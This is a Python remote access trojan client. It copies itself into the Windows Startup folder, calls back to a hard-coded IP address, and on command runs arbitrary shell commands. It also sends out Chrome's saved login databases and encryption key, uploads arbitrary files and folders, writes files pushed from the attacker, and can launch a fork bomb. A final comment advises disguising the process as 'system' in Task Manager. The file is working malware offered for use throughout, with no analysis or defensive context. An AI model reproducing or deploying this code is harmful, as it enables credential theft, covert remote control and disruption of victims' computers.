import socket
import glob, os, sys
import time
import subprocess

host = socket.socket()

port = 6666

subprocess.run(f'COPY "C:\\Users\\{os.getlogin()}\\Downloads\\pt2.exe" "C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"', capture_output= True, text=True, shell=True)

#waiting for connection from hot
while True:
    try:
        host.connect(('67.70.86.114', port))
        host.send('client is connected to host'.encode())
        print(host.recv(1024).decode())
    except:
        continue
    else:
        break

#if an error happens then it will disconnect and wait for a reconnection instead of exiting the code
def myhook(*args):
    time.sleep(1)
    print('Waiting For Reconnection')
    while True:
        try:
            host = socket.socket()
            host.connect(('67.70.86.114', port))
            host.send('client is connected to host'.encode())
            print(host.recv(1024).decode())
            print('Reconnected')
        except:
            continue
        else:
            break
    sys.__excepthook__(*args)

sys.excepthook = myhook

#recieving the message from host
while True:
    messagesent = host.recv(1024).decode()
    #if the host sends nothing (impossible for the user to manually do therefore it means an error happened) it will disconnect and wait for a reconnection
    if messagesent == '' or messagesent == None:
        time.sleep(1)
        print('Waiting For Reconnection')
        while True:
            try:
                host = socket.socket()
                host.connect(('67.70.86.114', port))
                host.send('client is connected to host'.encode())
                print(host.recv(1024).decode())
                print('Reconnected')
            except:
                continue
            else:
                break
    print(messagesent)

    #if the host sends the message stop, then it will disconnect and wait or a reconnection
    if messagesent == 'stop':
        host.close()
        time.sleep(1)
        print('Waiting For Reconnection')
        while True:
            try:
                host = socket.socket()
                host.connect(('67.70.86.114', port))
                host.send('client is connected to host'.encode())
                print(host.recv(1024).decode())
                print('Reconnected')
            except:
                continue
            else:
                break
    #if the host sends the message shell then it will wait for another string. it will then execute that string in a shell window. it will send the output back to the host (will get angry if there is no command and will specify if the terminal returned no output)
    if messagesent == 'shell':
        shelloutput = subprocess.run(host.recv(1024).decode(), capture_output= True, text=True, shell=True)
        print(shelloutput.stdout)
        if shelloutput.stdout == None or shelloutput.stdout == '':
            host.send(str(31).encode())
            host.recv(1024).decode()
            host.send('The Terminal Returned No Output'.encode())
        else:
            host.send(str(len(shelloutput.stdout)).encode())
            host.recv(1024).decode()
            host.send(shelloutput.stdout.encode())
    #a testing command (do not use in normal circumstances)
    if messagesent == 'manualcopy':
        subprocess.run(f'COPY "C:\\Users\\{os.getlogin()}\\Downloads\\pt2.py" "C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"', capture_output= True, text=True, shell=True)
    #creates a fork bomb (will need confirmation again from host)
    if messagesent == 'bomb':
        if host.recv(1024).decode() == 'yes':
            while True:
                subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
    #will send the necessary files to decode all saved chrome passwords
    if messagesent == 'chrome':
            data = []

            for file in glob.glob(rf'C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data\*\*', recursive=True):
                print(file)
                if 'Login' in file:
                    data.append(file)

            for file in glob.glob(rf'C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data\*', recursive=True):
                print(file)
                if 'Local State' in file:
                    data.append(file)

            print(data)

            host.send(str(len(data)).encode())

            print(host.recv(1024).decode())

            for file in data:
                with open(file, 'rb') as readfile:
                    host.send(str(os.stat(file).st_size).encode())
                    host.recv(1024).decode()
                    host.send(readfile.read())
    #will copy and send a file specified by the host
    if messagesent == 'copy':
        data = []
        file_ext = []

        for file in glob.glob(rf'{host.recv(1024).decode()}', recursive=True):
            print(file)
            file_name, file_ext1 = os.path.splitext(file)
            if not file_ext1 == '':
                file_ext.append(file_ext1)
            try:
                with open(file, 'rb'):
                    print(file)
                data.append(file)
            except:
                print("can't copy file")
        
        print(data)
        print(len(data))


        host.send(str(len(data)).encode())

        print(host.recv(1024).decode())

        for ext in file_ext:
            host.send(str(ext).encode())
            host.recv(1024).decode()

        for file in data:
            with open(file, 'rb') as readfile:
                host.send(str(os.stat(file).st_size).encode())
                host.recv(1024).decode()
                host.send(readfile.read())    
    #copies all files within one folder                
    if messagesent == 'copyall':
        data = []
        file_ext = []

        for file in glob.glob(rf'{host.recv(1024).decode()}\*', recursive=True):
            print(file)
            file_name, file_ext1 = os.path.splitext(file)
            if not file_ext1 == '':
                file_ext.append(file_ext1)
            try:
                with open(file, 'rb'):
                    print(file)
                data.append(file)
            except:
                print("can't copy file")
        
        print(data)
        print(len(data))


        host.send(str(len(data)).encode())

        print(host.recv(1024).decode())

        for ext in file_ext:
            host.send(str(ext).encode())
            host.recv(1024).decode()

        for file in data:
            with open(file, 'rb') as readfile:
                host.send(str(os.stat(file).st_size).encode())
                host.recv(1024).decode()
                host.send(readfile.read())
    #sends one file from the host to the client
    if messagesent == 'send':
        writingfile = host.recv(1024).decode()
        
        host.send('clear'.encode())

        writingname = host.recv(1024).decode()
        
        host.send('clear'.encode())

        data_len = int(host.recv(1024).decode())
        print(data_len)
        host.send('data received'.encode())

        file_ext = []

        for i in range(data_len):
            file_ext.append(host.recv(1024).decode())
            host.send(str(file_ext[i]).encode())

        for i in range(data_len):
            with open(rf'{writingfile}\{writingname}{file_ext[i]}', 'wb') as file:
                filechunk = int(host.recv(1024).decode())
                host.send('clear'.encode())
                file.write(host.recv(filechunk))
    #sends all files in one folder from the host to the client
    if messagesent == 'sendall':
        writingfile = host.recv(1024).decode()
        
        host.send('clear'.encode())

        writingname = host.recv(1024).decode()
        
        host.send('clear'.encode())

        data_len = int(host.recv(1024).decode())
        print(data_len)
        host.send('data received'.encode())

        file_ext = []

        for i in range(data_len):
            file_ext.append(host.recv(1024).decode())
            host.send(str(file_ext[i]).encode())

        for i in range(data_len):
            with open(rf'{writingfile}\{writingname}{i}{file_ext[i]}', 'wb') as file:
                filechunk = int(host.recv(1024).decode())
                host.send('clear'.encode())
                file.write(host.recv(filechunk))
#name the finished prouduct "system" so that when it shows up in task manager it will show up as "system"